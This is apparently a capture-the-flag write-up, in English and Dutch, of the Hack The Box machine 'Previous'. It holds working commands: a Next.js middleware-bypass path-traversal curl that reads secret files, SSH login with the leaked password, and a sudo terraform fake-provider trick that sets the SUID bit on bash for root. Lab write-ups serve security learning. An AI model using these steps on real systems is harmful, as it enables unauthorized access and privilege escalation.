# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Previous]
└─$ nmap 10.129.181.151    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 19:01 CEST
Nmap scan report for 10.129.181.151
Host is up (0.043s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```
┌──(kali㉿kali)-[~/HTB/Previous]
└─$ nmap -sCV 10.129.181.151 -vvvv
///
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: PreviousJS
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
///
```

Ik heb door gebruik te maken van whatweb, heb ik gezien dat de user jeremy is waarmee we zullen kunnen inloggen op de ssh server.

```
┌──(kali㉿kali)-[~/HTB/Previous]
└─$ whatweb http://previous.htb/ 
http://previous.htb/ [200 OK] Country[RESERVED][ZZ], Email[jeremy@previous.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.181.151], Script[application/json], X-Powered-By[Next.js], nginx[1.18.0]
```

Hier kan je zien dat de website Powered-By `Next.js` is. Ik zal nu gaan zoeken naar een exploit.

```
curl -s 'http://previous.htb/api/download?example=../../../../../../proc/self/cwd/.env' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'                                                 
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a


┌──(kali㉿kali)-[~/HTB/Previous/CVE-2025-29927-PoC-Exploit]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../../../proc/self/cwd/.next/server/pages/api/auth/%5B...nextauth%5D.js' \
  -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
```

| Username | Password                       |
| -------- | ------------------------------ |
| jeremy   | MyNameIsJeremyAndILovePancakes |
```
┌──(kali㉿kali)-[~/HTB/Previous/CVE-2025-29927-PoC-Exploit]
└─$ ssh jeremy@previous.htb        
jeremy@previous.htb's password: MyNameIsJeremyAndILovePancakes

Last login: Sun Aug 24 18:42:58 2025 from 10.10.14.142
jeremy@previous:~$
```

User flag: 05d58580914ec460a157840ac595f02b

```
jeremy@previous:~$ cat user.txt 
05d58580914ec460a157840ac595f02b
```

Ik ben het sudo -l commando gaan gebruiken voor het zien of dat er geen commando's waren die ik in de naam van de root user kon gaan uitvoeren.

```
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Als eerst zullen we een andere directery moeten gaan aanmaken. Hierbij ben ik een directory gaan aanmaken met de naam root. Deze naam kan je zelf beslissen.

```
jeremy@previous:~$ mkdir root
```

Hierna zal je in een file gaan aanmaken waarin je het /bin/bash commando zult gaan inzetten.

```
jeremy@previous:~/root$ echo '#!/bin/bash 
chmod u+s /bin/bash' > terraform-provider-examples
```

Nu zal je als eerst executable rechten moeten gaan geven aan dit bestand. Dit kan je gaan doen door het volgende commando uittevoeren.

```
chmod +x /home/jeremy/root/terraform-provider-examples
```

Nu kan ik in mijn eigen home directory (`/home/jeremy/root`) een nep-provider neerzetten (bijvoorbeeld een scriptje dat `/bin/bash` draait). Wanneer ik daarna `sudo terraform apply` uitvoer, gebruikt Terraform mijn nep-provider en start die als **root**.

```
sed -i 's/\/usr\/local\/go\/bin/\/home\/jeremy\/root/' /home/jeremy/.terraformrc
```

Nu zullen we het sudo commando gaan uitvoeren. Hiermee 

```
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Bash commando als root user opzetten.

```
jeremy@previous:~$ bash -p
```

Zoals je nu kunt zien hebben we een connectie als de root user.

```
bash-5.1# cat root.txt 
3eec18b20b61bea39765af77f64f86ce
```